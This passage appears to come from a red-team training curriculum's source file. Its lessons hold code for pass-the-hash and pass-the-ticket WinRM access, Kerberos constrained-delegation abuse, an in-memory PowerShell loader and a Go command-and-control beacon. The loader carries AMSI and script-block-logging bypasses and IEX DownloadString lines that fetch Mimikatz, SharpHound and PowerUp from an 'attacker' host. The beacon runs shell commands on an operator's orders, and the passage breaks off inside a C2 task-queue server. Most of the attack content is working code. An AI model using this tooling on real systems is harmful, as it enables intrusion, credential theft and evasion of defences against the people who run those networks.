)

if client.authenticate():
    print("[+] Pass-the-Hash successful!")
\`\`\`

### Key Concepts

- **NT Hash**: MD4 hash of Unicode password - this is what we pass
- **NTLMv2 Response**: HMAC-MD5 computation using NT hash as key, no password needed
- **Type 3 Construction**: Build authentication message directly from hash
- **Lateral Movement**: Use hashes from mimikatz/secretsdump for network access

### Practice Tasks

- [ ] Parse NTLM hash format (LM:NT and standalone NT)
- [ ] Implement Type 1 (Negotiate) message construction
- [ ] Parse Type 2 (Challenge) and extract server challenge
- [ ] Calculate NTLMv2 response using hash directly
- [ ] Build complete Type 3 (Authenticate) message
- [ ] Integrate with WinRM SOAP envelope requests
- [ ] Test against Windows target with known hash

### Completion Criteria

- [ ] Successfully authenticate with hash only (no password)
- [ ] Works with both LM:NT format and standalone NT hash
- [ ] Compatible with Windows Server 2016+ (NTLMv2 required)
- [ ] Can execute commands after PtH authentication
- [ ] Handle authentication failures gracefully`],
		['Build script execution', 'Load PowerShell scripts into memory using IEX (Invoke-Expression) or reflection. Bypass ExecutionPolicy with -ep bypass flag. Example: IEX(New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")', `## Overview

Implement in-memory script execution over WinRM - load and run PowerShell scripts without writing to disk. This is essential for red team operations where script files would trigger AV/EDR alerts.

### Execution Methods

\`\`\`
Disk-Based (Detectable):
┌────────┐  Write   ┌────────┐  Execute  ┌────────┐
│ Script │ ───────▶ │ .ps1   │ ────────▶ │ Output │
└────────┘  to disk │ File   │  (logged) └────────┘
                    └────────┘
                         ▲
                    AV/EDR Detection

Memory-Based (Stealthy):
┌────────┐  Base64  ┌────────┐   IEX     ┌────────┐
│ Script │ ───────▶ │ Memory │ ────────▶ │ Output │
└────────┘  encode  │ Only   │  (fast)   └────────┘
                    └────────┘
                    No file artifacts
\`\`\`

### Implementation

\`\`\`python
import os
import gzip
import urllib.request
from base64 import b64encode, b64decode
from typing import Optional, Callable

class PowerShellLoader:
    """In-memory PowerShell script execution over WinRM"""

    def __init__(self, winrm_client):
        self.client = winrm_client

    def execute_script(self, script: str, bypass_amsi: bool = False,
                       bypass_logging: bool = False) -> tuple:
        """Execute PowerShell script in memory"""

        # Build execution wrapper
        wrapper = self._build_wrapper(
            script,
            bypass_amsi=bypass_amsi,
            bypass_logging=bypass_logging
        )

        return self.client.run_command(wrapper)

    def execute_file(self, script_path: str, **kwargs) -> tuple:
        """Load and execute script from local file"""

        with open(script_path, 'r', encoding='utf-8-sig') as f:
            script = f.read()

        return self.execute_script(script, **kwargs)

    def execute_url(self, url: str, **kwargs) -> tuple:
        """Download and execute script from URL (in-memory)"""

        # This runs ON the target - downloads directly to target memory
        download_cmd = f'''
        $script = (New-Object Net.WebClient).DownloadString("{url}")
        Invoke-Expression $script
        '''

        return self.execute_script(download_cmd, **kwargs)

    def execute_encoded(self, script: str) -> tuple:
        """Execute via PowerShell's -EncodedCommand parameter"""

        # Encode as UTF-16LE Base64 (PowerShell's expected format)
        encoded = b64encode(script.encode('utf-16le')).decode('ascii')

        cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}'

        return self.client.run_command(cmd)

    def execute_compressed(self, script: str) -> tuple:
        """Execute compressed script (bypass length limits)"""

        # Compress with gzip
        compressed = gzip.compress(script.encode('utf-8'))
        encoded = b64encode(compressed).decode('ascii')

        # Decompress and execute on target
        decompress_cmd = f'''
        $data = [Convert]::FromBase64String("{encoded}")
        $ms = New-Object IO.MemoryStream(,$data)
        $gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
        $sr = New-Object IO.StreamReader($gz)
        $script = $sr.ReadToEnd()
        Invoke-Expression $script
        '''

        return self.client.run_command(decompress_cmd)

    def _build_wrapper(self, script: str, bypass_amsi: bool = False,
                       bypass_logging: bool = False) -> str:
        """Build script wrapper with optional bypasses"""

        wrapper_parts = []

        # Add AMSI bypass if requested
        if bypass_amsi:
            wrapper_parts.append(self._get_amsi_bypass())

        # Add logging bypass if requested
        if bypass_logging:
            wrapper_parts.append(self._get_logging_bypass())

        # Add the actual script
        wrapper_parts.append(script)

        # Join and encode
        full_script = '\\n'.join(wrapper_parts)

        # Use IEX with encoded block for execution
        encoded = b64encode(full_script.encode('utf-16le')).decode('ascii')

        return f'''
        $decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("{encoded}"))
        Invoke-Expression $decoded
        '''

    def _get_amsi_bypass(self) -> str:
        """Return AMSI bypass technique"""

        # Simple AMSI bypass - patch AmsiScanBuffer
        # Note: This is a well-known technique that may be detected
        return '''
        $a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
        $f = $a.GetFields("NonPublic,Static") | ? {$_.Name -like "*Context"}
        [IntPtr]$ptr = $f.GetValue($null)
        [Int32[]]$buf = @(0)
        [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
        '''

    def _get_logging_bypass(self) -> str:
        """Return script block logging bypass"""

        return '''
        $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static")
        $gp = $settings.GetValue($null)
        $gp["ScriptBlockLogging"]["EnableScriptBlockLogging"] = 0
        $gp["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"] = 0
        '''

    # Common offensive scripts
    def run_mimikatz(self, command: str = "sekurlsa::logonpasswords") -> tuple:
        """Download and run Invoke-Mimikatz in memory"""

        # Would typically download from your C2 or hosting
        script = f'''
        IEX(New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")
        Invoke-Mimikatz -Command "{command}"
        '''

        return self.execute_script(script, bypass_amsi=True)

    def run_bloodhound(self, collection_method: str = "All") -> tuple:
        """Run SharpHound collector in memory"""

        script = f'''
        IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1")
        Invoke-BloodHound -CollectionMethod {collection_method}
        '''

        return self.execute_script(script, bypass_amsi=True)

    def run_powerup(self) -> tuple:
        """Run PowerUp privilege escalation checks"""

        script = '''
        IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerUp.ps1")
        Invoke-AllChecks
        '''

        return self.execute_script(script)


# Usage examples
loader = PowerShellLoader(winrm_client)

# Execute local script file
stdout, stderr = loader.execute_file('/local/scripts/recon.ps1')

# Execute from URL directly on target
stdout, stderr = loader.execute_url('http://192.168.1.50/Invoke-Recon.ps1')

# Execute with AMSI bypass for offensive tools
stdout, stderr = loader.run_mimikatz("privilege::debug sekurlsa::logonpasswords")
\`\`\`

### Key Concepts

- **IEX (Invoke-Expression)**: Executes string as PowerShell code - key to memory-only execution
- **EncodedCommand**: PowerShell's -enc flag accepts UTF-16LE Base64 encoded commands
- **Compression**: Use gzip to bypass command length limits and reduce transfer size
- **AMSI Bypass**: Patch AMSI in memory before running detected tools
- **Script Block Logging**: Disable to avoid command logging in Event Logs

### Practice Tasks

- [ ] Implement basic IEX execution with string encoding
- [ ] Add -EncodedCommand support for complex scripts
- [ ] Implement gzip compression for large scripts
- [ ] Add AMSI bypass techniques
- [ ] Implement script block logging bypass
- [ ] Build wrappers for common offensive tools
- [ ] Handle execution errors and output parsing

### Completion Criteria

- [ ] Execute arbitrary PowerShell without files on disk
- [ ] Successfully run offensive scripts (mimikatz, etc.)
- [ ] AMSI bypass allows detected tools to run
- [ ] Compression handles large scripts efficiently
- [ ] Clean output parsing for results`],
		['Add Kerberos auth', 'Authenticate using Kerberos tickets (.kirbi files) for pass-the-ticket. Support S4U2Self/S4U2Proxy for constrained delegation abuse. Allow ccache file import for Linux interoperability.', `## Overview

Implement Kerberos authentication for WinRM using existing tickets instead of passwords. This enables pass-the-ticket attacks and constrained delegation abuse through WinRM connections.

### Kerberos Authentication Flow

\`\`\`
Pass-the-Ticket via WinRM:
┌─────────────┐   Import    ┌─────────────┐   WinRM    ┌─────────────┐
│ .kirbi/.ccache│ ────────▶ │  Memory     │ ────────▶ │   Target    │
│   Ticket    │            │  (KRB5CCNAME)│  + GSSAPI │   Server    │
└─────────────┘            └─────────────┘            └─────────────┘

S4U Delegation Abuse:
┌─────────────┐  S4U2Self  ┌─────────────┐  S4U2Proxy ┌─────────────┐
│ Compromised │ ────────▶  │  Get TGS    │ ────────▶  │  Access     │
│  Service    │  (any user)│  for user   │ (to target)│  as user    │
└─────────────┘            └─────────────┘            └─────────────┘
\`\`\`

### Implementation

\`\`\`python
import os
import struct
import socket
from base64 import b64encode, b64decode
from typing import Optional, Tuple
from datetime import datetime, timedelta

# For Kerberos - use minikerberos or impacket
try:
    from minikerberos.common.ccache import CCACHE
    from minikerberos.common.kirbi import Kirbi
    from minikerberos.protocol.asn1_structs import AP_REQ, Authenticator
    from minikerberos.protocol.encryption import Key, EncryptionType
except ImportError:
    print("Install: pip install minikerberos")


class KerberosTicket:
    """Kerberos ticket handling for WinRM authentication"""

    def __init__(self):
        self.ticket = None
        self.session_key = None
        self.client_principal = None
        self.service_principal = None

    @classmethod
    def from_kirbi(cls, kirbi_path: str) -> 'KerberosTicket':
        """Load ticket from .kirbi file (Rubeus/Mimikatz format)"""

        kt = cls()

        with open(kirbi_path, 'rb') as f:
            kirbi_data = f.read()

        kirbi = Kirbi.from_bytes(kirbi_data)
        kt.ticket = kirbi.ticket
        kt.session_key = kirbi.session_key
        kt.client_principal = kirbi.client_principal
        kt.service_principal = kirbi.service_principal

        return kt

    @classmethod
    def from_ccache(cls, ccache_path: str, service: str = None) -> 'KerberosTicket':
        """Load ticket from ccache file (Linux/Impacket format)"""

        kt = cls()

        ccache = CCACHE.from_file(ccache_path)

        # Find matching ticket for service
        for cred in ccache.credentials:
            spn = cred.server.to_string()
            if service is None or service.lower() in spn.lower():
                kt.ticket = cred.ticket
                kt.session_key = cred.key
                kt.client_principal = cred.client.to_string()
                kt.service_principal = spn
                break

        if kt.ticket is None:
            raise ValueError(f"No ticket found for service: {service}")

        return kt

    def to_ccache(self, output_path: str):
        """Export ticket to ccache format"""

        ccache = CCACHE()
        ccache.add_credential(
            client=self.client_principal,
            server=self.service_principal,
            ticket=self.ticket,
            key=self.session_key
        )
        ccache.to_file(output_path)


class WinRMKerberos:
    """WinRM client with Kerberos (GSSAPI) authentication"""

    def __init__(self, host: str, ticket: KerberosTicket = None,
                 ccache_path: str = None, port: int = 5985):
        self.host = host
        self.port = port
        self.endpoint = f"http://{host}:{port}/wsman"

        if ticket:
            self.ticket = ticket
        elif ccache_path:
            # Extract target SPN from hostname
            spn = f"HTTP/{host}"
            self.ticket = KerberosTicket.from_ccache(ccache_path, spn)
        else:
            raise ValueError("Provide ticket or ccache_path")

        self.session = None

    def _build_ap_req(self) -> bytes:
        """Build AP-REQ message for GSSAPI authentication"""

        # Create authenticator
        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = self.ticket.client_principal.split('@')[1]
        authenticator['cname'] = {
            'name-type': 1,
            'name-string': [self.ticket.client_principal.split('@')[0]]
        }
        authenticator['ctime'] = datetime.utcnow()
        authenticator['cusec'] = 0

        # Encrypt authenticator with session key
        enc_authenticator = self._encrypt(
            self.ticket.session_key,
            authenticator.dump()
        )

        # Build AP-REQ
        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = 14  # AP-REQ
        ap_req['ap-options'] = b'\\x00\\x00\\x00\\x00'
        ap_req['ticket'] = self.ticket.ticket
        ap_req['authenticator'] = enc_authenticator

        return ap_req.dump()

    def _build_gssapi_token(self, ap_req: bytes) -> bytes:
        """Wrap AP-REQ in GSSAPI token"""

        # SPNEGO OID: 1.3.6.1.5.5.2
        spnego_oid = b'\\x06\\x06\\x2b\\x06\\x01\\x05\\x05\\x02'

        # Kerberos OID: 1.2.840.113554.1.2.2
        krb5_oid = b'\\x06\\x09\\x2a\\x86\\x48\\x86\\xf7\\x12\\x01\\x02\\x02'

        # Build mechToken
        mech_token = krb5_oid + ap_req

        # Build SPNEGO NegTokenInit
        # This is simplified - real implementation needs proper ASN.1
        token = (
            b'\\x60' +  # Application tag
            self._encode_length(len(spnego_oid) + len(mech_token) + 4) +
            spnego_oid +
            b'\\xa0' +  # Context tag 0
            self._encode_length(len(mech_token) + 2) +
            b'\\x30' +  # Sequence
            self._encode_length(len(mech_token)) +
            mech_token
        )

        return token

    def authenticate(self) -> bool:
        """Perform Kerberos authentication"""

        import requests
        from requests_kerberos import HTTPKerberosAuth, REQUIRED

        # Set KRB5CCNAME to use our ticket
        ccache_path = '/tmp/winrm_krb5cc'
        self.ticket.to_ccache(ccache_path)
        os.environ['KRB5CCNAME'] = ccache_path

        # Create session with Kerberos auth
        self.session = requests.Session()
        self.session.auth = HTTPKerberosAuth(mutual_authentication=REQUIRED)

        # Test authentication
        response = self.session.post(
            self.endpoint,
            headers={'Content-Type': 'application/soap+xml;charset=UTF-8'},
            data=self._build_test_envelope()
        )

        return response.status_code == 200

    def _encode_length(self, length: int) -> bytes:
        """ASN.1 length encoding"""
        if length < 128:
            return bytes([length])
        elif length < 256:
            return bytes([0x81, length])
        else:
            return bytes([0x82, (length >> 8) & 0xff, length & 0xff])


class S4UClient:
    """S4U2Self and S4U2Proxy for constrained delegation abuse"""

    def __init__(self, domain: str, dc_ip: str, service_ticket: KerberosTicket):
        self.domain = domain
        self.dc_ip = dc_ip
        self.service_ticket = service_ticket  # TGT of compromised service account

    def s4u2self(self, target_user: str) -> KerberosTicket:
        """
        Request service ticket for any user to ourselves (S4U2Self).
        Requires: Service account with TrustedToAuthForDelegation
        """

        from minikerberos.network.clientsocket import KerberosClientSocket
        from minikerberos.protocol.asn1_structs import TGS_REQ, PA_FOR_USER

        # Build PA-FOR-USER for target user
        pa_for_user = PA_FOR_USER()
        pa_for_user['userName'] = {'name-type': 1, 'name-string': [target_user]}
        pa_for_user['userRealm'] = self.domain.upper()

        # Build TGS-REQ with S4U2Self
        tgs_req = TGS_REQ()
        # ... (full S4U2Self implementation)

        # Send to KDC
        sock = KerberosClientSocket(self.dc_ip, 88)
        response = sock.sendrecv(tgs_req.dump())

        # Parse TGS-REP and extract ticket
        # This ticket is for target_user to our service

        return self._parse_tgs_rep(response)

    def s4u2proxy(self, user_ticket: KerberosTicket,
                   target_service: str) -> KerberosTicket:
        """
        Use user's ticket to request ticket to target service (S4U2Proxy).
        Requires: Service account with msDS-AllowedToDelegateTo
        """

        from minikerberos.protocol.asn1_structs import TGS_REQ, PA_PAC_OPTIONS

        # Build TGS-REQ with S4U2Proxy
        # Include the ticket from S4U2Self as additional-tickets
        tgs_req = TGS_REQ()
        # ... (full S4U2Proxy implementation)

        # Send to KDC
        sock = KerberosClientSocket(self.dc_ip, 88)
        response = sock.sendrecv(tgs_req.dump())

        # Result is a ticket for target_user to target_service
        return self._parse_tgs_rep(response)

    def abuse_constrained_delegation(self, target_user: str,
                                      target_service: str) -> KerberosTicket:
        """
        Full constrained delegation attack:
        1. S4U2Self to get ticket for target user
        2. S4U2Proxy to get ticket to target service as that user
        """

        print(f"[*] S4U2Self: Getting ticket for {target_user}")
        user_ticket = self.s4u2self(target_user)

        print(f"[*] S4U2Proxy: Getting ticket to {target_service}")
        service_ticket = self.s4u2proxy(user_ticket, target_service)

        print(f"[+] Got ticket for {target_user} to {target_service}")
        return service_ticket


# Usage examples

# Pass-the-Ticket with .kirbi file (from Rubeus)
ticket = KerberosTicket.from_kirbi('/path/to/admin.kirbi')
client = WinRMKerberos('dc01.corp.local', ticket=ticket)
if client.authenticate():
    print("[+] Pass-the-Ticket successful!")

# Use ccache from Linux (Impacket)
client = WinRMKerberos('dc01.corp.local', ccache_path='/tmp/krb5cc_admin')
client.authenticate()

# Constrained Delegation abuse
s4u = S4UClient('corp.local', '192.168.1.10', service_tgt)
admin_ticket = s4u.abuse_constrained_delegation(
    target_user='Administrator',
    target_service='HTTP/fileserver.corp.local'
)
\`\`\`

### Key Concepts

- **Pass-the-Ticket**: Use stolen Kerberos tickets for authentication
- **.kirbi vs .ccache**: Windows (Rubeus/Mimikatz) vs Linux (MIT/Impacket) formats
- **S4U2Self**: Request ticket for any user to your service (needs special priv)
- **S4U2Proxy**: Forward user ticket to allowed services (constrained delegation)
- **GSSAPI/SPNEGO**: How Kerberos tokens are wrapped for HTTP authentication

### Practice Tasks

- [ ] Parse .kirbi files from Rubeus output
- [ ] Convert between .kirbi and ccache formats
- [ ] Implement AP-REQ construction from ticket
- [ ] Build GSSAPI/SPNEGO token wrapper
- [ ] Integrate with requests-kerberos for HTTP auth
- [ ] Implement S4U2Self ticket request
- [ ] Implement S4U2Proxy delegation

### Completion Criteria

- [ ] Authenticate to WinRM using .kirbi ticket
- [ ] Authenticate using ccache from Impacket
- [ ] Convert tickets between formats
- [ ] Execute S4U2Self to impersonate users
- [ ] Chain S4U for constrained delegation abuse`],
	] as [string, string, string][] },
	{ name: 'C2 Features', desc: 'Command and control', tasks: [
		['Build beacon client', 'Create agent with configurable sleep (e.g., 60s) and jitter (e.g., 20% = 48-72s actual). Check in via HTTP GET, receive tasking in response, execute, and POST results. Support sleep command to adjust intervals.', `## Overview

Build a beacon-style implant that periodically checks in with the C2 server, receives tasks, executes them, and returns results. The beacon pattern with jitter makes traffic less predictable and harder to detect.

### Beacon Architecture

\`\`\`
┌─────────────────────────────────────────────────────────┐
│                    Beacon Client                         │
├─────────────────────────────────────────────────────────┤
│  ┌─────────┐  ┌──────────┐  ┌─────────┐  ┌───────────┐ │
│  │ Config  │  │  HTTP    │  │  Task   │  │  Result   │ │
│  │ Manager │  │ Comms    │  │ Executor│  │  Queue    │ │
│  └────┬────┘  └────┬─────┘  └────┬────┘  └─────┬─────┘ │
│       │            │             │              │       │
│       └────────────┴─────────────┴──────────────┘       │
│                         │                               │
└─────────────────────────┼───────────────────────────────┘
                          │
                    Sleep + Jitter
                          │
                          ▼
                  ┌───────────────┐
                  │   C2 Server   │
                  └───────────────┘
\`\`\`

### Implementation

\`\`\`go
package main

import (
    "bytes"
    "crypto/rand"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "math/big"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"
)

type BeaconConfig struct {
    C2Server      string        \`json:"c2_server"\`
    Sleep         time.Duration \`json:"sleep"\`
    Jitter        float64       \`json:"jitter"\`  // 0.0 - 1.0
    UserAgent     string        \`json:"user_agent"\`
    BeaconID      string        \`json:"beacon_id"\`
    MaxRetries    int           \`json:"max_retries"\`
    KillDate      time.Time     \`json:"kill_date"\`
}

type Task struct {
    ID      string   \`json:"id"\`
    Command string   \`json:"command"\`
    Args    []string \`json:"args"\`
}

type TaskResult struct {
    TaskID   string \`json:"task_id"\`
    BeaconID string \`json:"beacon_id"\`
    Output   string \`json:"output"\`
    Error    string \`json:"error"\`
    ExitCode int    \`json:"exit_code"\`
}

type Beacon struct {
    config  BeaconConfig
    client  *http.Client
    running bool
}

func NewBeacon(config BeaconConfig) *Beacon {
    return &Beacon{
        config: config,
        client: &http.Client{
            Timeout: 30 * time.Second,
        },
        running: true,
    }
}

func (b *Beacon) Run() {
    // Initial check-in with system info
    b.register()

    for b.running {
        // Check kill date
        if !b.config.KillDate.IsZero() && time.Now().After(b.config.KillDate) {
            b.running = false
            break
        }

        // Check in and get tasks
        tasks, err := b.checkIn()
        if err != nil {
            b.sleepWithJitter()
            continue
        }

        // Execute tasks
        for _, task := range tasks {
            result := b.executeTask(task)
            b.sendResult(result)
        }

        // Sleep with jitter
        b.sleepWithJitter()
    }
}

func (b *Beacon) register() error {
    info := map[string]string{
        "beacon_id": b.config.BeaconID,
        "hostname":  getHostname(),
        "username":  getUsername(),
        "os":        runtime.GOOS,
        "arch":      runtime.GOARCH,
        "pid":       fmt.Sprintf("%d", os.Getpid()),
    }

    data, _ := json.Marshal(info)

    req, _ := http.NewRequest("POST",
        b.config.C2Server+"/register",
        bytes.NewBuffer(data))
    req.Header.Set("User-Agent", b.config.UserAgent)
    req.Header.Set("Content-Type", "application/json")

    resp, err := b.client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    return nil
}

func (b *Beacon) checkIn() ([]Task, error) {
    // GET request to check for tasks
    req, _ := http.NewRequest("GET",
        b.config.C2Server+"/tasks/"+b.config.BeaconID,
        nil)
    req.Header.Set("User-Agent", b.config.UserAgent)

    resp, err := b.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    if resp.StatusCode != 200 {
        return nil, fmt.Errorf("check-in failed: %d", resp.StatusCode)
    }

    // Parse tasks from response
    var tasks []Task
    body, _ := io.ReadAll(resp.Body)

    // Handle empty response (no tasks)
    if len(body) == 0 || string(body) == "[]" {
        return nil, nil
    }

    if err := json.Unmarshal(body, &tasks); err != nil {
        return nil, err
    }

    return tasks, nil
}

func (b *Beacon) executeTask(task Task) TaskResult {
    result := TaskResult{
        TaskID:   task.ID,
        BeaconID: b.config.BeaconID,
    }

    switch task.Command {
    case "shell":
        result = b.executeShell(task)
    case "sleep":
        result = b.changeSleep(task)
    case "exit":
        b.running = false
        result.Output = "Beacon exiting"
    case "upload":
        result = b.handleUpload(task)
    case "download":
        result = b.handleDownload(task)
    default:
        result.Error = fmt.Sprintf("Unknown command: %s", task.Command)
        result.ExitCode = 1
    }

    return result
}

func (b *Beacon) executeShell(task Task) TaskResult {
    result := TaskResult{
        TaskID:   task.ID,
        BeaconID: b.config.BeaconID,
    }

    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        args := append([]string{"/c"}, task.Args...)
        cmd = exec.Command("cmd.exe", args...)
    } else {
        cmd = exec.Command("/bin/sh", "-c", task.Args[0])
    }

    output, err := cmd.CombinedOutput()
    result.Output = string(output)

    if err != nil {
        if exitErr, ok := err.(*exec.ExitError); ok {
            result.ExitCode = exitErr.ExitCode()
        } else {
            result.Error = err.Error()
            result.ExitCode = 1
        }
    }

    return result
}

func (b *Beacon) changeSleep(task Task) TaskResult {
    result := TaskResult{
        TaskID:   task.ID,
        BeaconID: b.config.BeaconID,
    }

    if len(task.Args) > 0 {
        duration, err := time.ParseDuration(task.Args[0])
        if err == nil {
            b.config.Sleep = duration
            result.Output = fmt.Sprintf("Sleep changed to %s", duration)
        } else {
            result.Error = err.Error()
        }
    }

    if len(task.Args) > 1 {
        var jitter float64
        fmt.Sscanf(task.Args[1], "%f", &jitter)
        if jitter >= 0 && jitter <= 1 {
            b.config.Jitter = jitter
            result.Output += fmt.Sprintf(", jitter: %.0f%%", jitter*100)
        }
    }

    return result
}

func (b *Beacon) sendResult(result TaskResult) error {
    data, _ := json.Marshal(result)

    req, _ := http.NewRequest("POST",
        b.config.C2Server+"/results",
        bytes.NewBuffer(data))
    req.Header.Set("User-Agent", b.config.UserAgent)
    req.Header.Set("Content-Type", "application/json")

    resp, err := b.client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    return nil
}

func (b *Beacon) sleepWithJitter() {
    // Calculate jitter: sleep * (1 +/- jitter)
    base := float64(b.config.Sleep)
    jitterRange := base * b.config.Jitter

    // Random value between -jitterRange and +jitterRange
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(jitterRange*2)))
    jitterValue := float64(n.Int64()) - jitterRange

    actualSleep := time.Duration(base + jitterValue)
    time.Sleep(actualSleep)
}

func getHostname() string {
    h, _ := os.Hostname()
    return h
}

func getUsername() string {
    if runtime.GOOS == "windows" {
        return os.Getenv("USERNAME")
    }
    return os.Getenv("USER")
}

func main() {
    config := BeaconConfig{
        C2Server:  "http://192.168.1.50:8080",
        Sleep:     60 * time.Second,
        Jitter:    0.2, // 20% jitter
        UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        BeaconID:  generateBeaconID(),
    }

    beacon := NewBeacon(config)
    beacon.Run()
}

func generateBeaconID() string {
    b := make([]byte, 8)
    rand.Read(b)
    return base64.RawURLEncoding.EncodeToString(b)
}
\`\`\`

### Key Concepts

- **Sleep + Jitter**: Base interval with random variation to avoid pattern detection
- **Check-in Cycle**: GET for tasks → Execute → POST results → Sleep
- **Task Types**: Shell commands, sleep adjustment, file ops, special commands
- **Kill Date**: Built-in expiration to limit implant lifetime
- **Registration**: Initial beacon includes system fingerprint

### Practice Tasks

- [ ] Implement basic HTTP check-in with GET request
- [ ] Add jitter calculation for sleep intervals
- [ ] Build task parsing from JSON response
- [ ] Implement shell command execution
- [ ] Add sleep command to dynamically adjust intervals
- [ ] Implement result encoding and POST back
- [ ] Add kill date functionality
- [ ] Handle connection errors with retry logic

### Completion Criteria

- [ ] Beacon checks in at configured intervals with jitter
- [ ] Tasks are received and executed correctly
- [ ] Results are sent back with output and exit codes
- [ ] Sleep can be adjusted dynamically via task
- [ ] Kill date terminates beacon as expected`],
		['Implement task queue', 'Queue commands (shell, upload, download, execute-assembly) with unique IDs. Track pending/running/completed status. Return structured results with stdout, stderr, exit code, and execution time.', `## Overview

Implement a task queuing system that manages command execution with proper tracking, status updates, and structured results. This is the core of C2 interaction - operators queue tasks, agents execute them, and results flow back.

### Task Queue Architecture

\`\`\`
Operator                    C2 Server                    Beacon
   │                           │                           │
   │── Queue Task ───────────▶ │                           │
   │                           │ ┌───────────────────────┐ │
   │                           │ │ Task Queue            │ │
   │                           │ │ ┌─────┬────────────┐  │ │
   │                           │ │ │ ID  │ Status     │  │ │
   │                           │ │ ├─────┼────────────┤  │ │
   │                           │ │ │ t1  │ pending    │  │ │
   │                           │ │ │ t2  │ running    │  │ │
   │                           │ │ │ t3  │ completed  │  │ │
   │                           │ │ └─────┴────────────┘  │ │
   │                           │ └───────────────────────┘ │
   │                           │                           │
   │                           │◀── Get Tasks ─────────────│
   │                           │─── Tasks (pending) ──────▶│
   │                           │                           │
   │                           │◀── Results ───────────────│
   │◀── View Results ──────────│                           │
\`\`\`

### Implementation

\`\`\`python
import uuid
import json
import time
import threading
from enum import Enum
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Any
from queue import Queue
import sqlite3

class TaskStatus(Enum):
    PENDING = "pending"
    QUEUED = "queued"      # Sent to beacon, awaiting execution
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"

class TaskType(Enum):
    SHELL = "shell"
    UPLOAD = "upload"
    DOWNLOAD = "download"
    EXECUTE_ASSEMBLY = "execute_assembly"
    INJECT = "inject"
    SLEEP = "sleep"
    EXIT = "exit"

@dataclass
class Task:
    """Task to be executed by beacon"""
    id: str
    beacon_id: str
    task_type: TaskType
    args: List[str]
    status: TaskStatus = TaskStatus.PENDING
    created_at: datetime = field(default_factory=datetime.utcnow)
    queued_at: Optional[datetime] = None
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    operator: str = "default"
    timeout: int = 300  # seconds

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "command": self.task_type.value,
            "args": self.args
        }

@dataclass
class TaskResult:
    """Result returned from beacon"""
    task_id: str
    beacon_id: str
    output: str = ""
    error: str = ""
    exit_code: int = 0
    received_at: datetime = field(default_factory=datetime.utcnow)
    execution_time: float = 0.0

class TaskQueue:
    """Server-side task queue management"""

    def __init__(self, db_path: str = "c2.db"):
        self.db_path = db_path
        self.lock = threading.Lock()
        self._init_db()

    def _init_db(self):
        """Initialize SQLite database for persistence"""
        conn = sqlite3.connect(self.db_path)
        conn.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id TEXT PRIMARY KEY,
                beacon_id TEXT NOT NULL,
                task_type TEXT NOT NULL,
                args TEXT NOT NULL,
                status TEXT NOT NULL,
                created_at TEXT,
                queued_at TEXT,
                started_at TEXT,
                completed_at TEXT,
                operator TEXT,
                timeout INTEGER
            )
        ''')
        conn.execute('''
            CREATE TABLE IF NOT EXISTS results (
                task_id TEXT PRIMARY KEY,
                beacon_id TEXT NOT NULL,
                output TEXT,
                error TEXT,
                exit_code INTEGER,
                received_at TEXT,
                execution_time REAL
            )
        ''')
        conn.commit()
        conn.close()

    def queue_task(self, beacon_id: str, task_type: TaskType,
                   args: List[str], operator: str = "default",
                   timeout: int = 300) -> Task:
        """Queue a new task for a beacon"""

        task = Task(
            id=str(uuid.uuid4()),
            beacon_id=beacon_id,
            task_type=task_type,
            args=args,
            operator=operator,
            timeout=timeout
        )

        with self.lock:
            conn = sqlite3.connect(self.db_path)
            conn.execute('''
                INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                task.id, task.beacon_id, task.task_type.value,
                json.dumps(task.args), task.status.value,
                task.created_at.isoformat(), None, None, None,
                task.operator, task.timeout
            ))
            conn.commit()
            conn.close()

        print(f"[+] Queued task {task.id[:8]} for beacon {beacon_id[:8]}")
        return task

    def get_pending_tasks(self, beacon_id: str) -> List[Task]:
        """Get all pending tasks for a beacon (called on check-in)"""

        tasks = []

        with self.lock:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.execute('''
                SELECT * FROM tasks
                WHERE beacon_id = ? AND status = ?
                ORDER BY created_at
            ''', (beacon_id, TaskStatus.PENDING.value))

            for row in cursor.fetchall():
                task = self._row_to_task(row)
                tasks.append(task)

            # Update status to QUEUED
            if tasks:
                task_ids = [t.id for t in tasks]
                placeholders = ','.join('?' * len(task_ids))
                conn.execute(f'''
                    UPDATE tasks
                    SET status = ?, queued_at = ?
                    WHERE id IN ({placeholders})
                ''', [TaskStatus.QUEUED.value, datetime.utcnow().isoformat()] + task_ids)
                conn.commit()

            conn.close()

        return tasks

    def update_task_status(self, task_id: str, status: TaskStatus):
        """Update task status"""

        timestamp_field = None
        if status == TaskStatus.RUNNING:
            timestamp_field = "started_at"
        elif status in (TaskStatus.COMPLETED, TaskStatus.FAILED):
            timestamp_field = "completed_at"

        with self.lock:
            conn = sqlite3.connect(self.db_path)
            if timestamp_field:
                conn.execute(f'''
